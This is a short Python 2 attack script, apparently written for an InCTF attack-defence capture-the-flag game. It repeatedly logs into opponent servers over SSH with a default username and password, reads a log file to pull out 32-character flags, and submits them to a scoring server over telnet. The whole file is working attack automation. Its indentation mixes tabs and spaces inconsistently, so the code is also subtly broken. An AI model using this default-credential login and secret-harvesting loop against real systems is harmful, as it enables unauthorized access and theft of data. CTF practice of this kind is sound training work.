#!/usr/bin/python
#this is to attack the default user vulnerabiliity in InCTF image 

import paramiko
import re
import telnetlib
import time
serv_list=(1,2)#list of ip
def submit(flags):
  print flags
	t=telnetlib.Telnet("10.1.100.1",31337)
        t.get_socket().recv(1024)
        t.write("2\n")
        t.get_socket().recv(1024)
        for flag in flags:
		t.write(flag+"\n")
		print flag
        	print t.get_socket().recv(1024).strip()
        t.close()
        time.sleep(5)

while True:
	flags=[]
	for no in serv_list:
		try:
			serv_addr='10.1.10%s.1'%no
			ssh=paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh.connect(serv_addr,username='player',password='password')
			stdin, stdout, stderr = ssh.exec_command('cat secret-service/logs')
			flag=re.findall("\S{32}",stdout.read())[-1]	
			flags.append(flag)
			ssh.close()
		except:
			print "Exception. ",no
			pass
	if len(flags)==0:
		print "Flag list emply."
	else:
		submit(flags)		
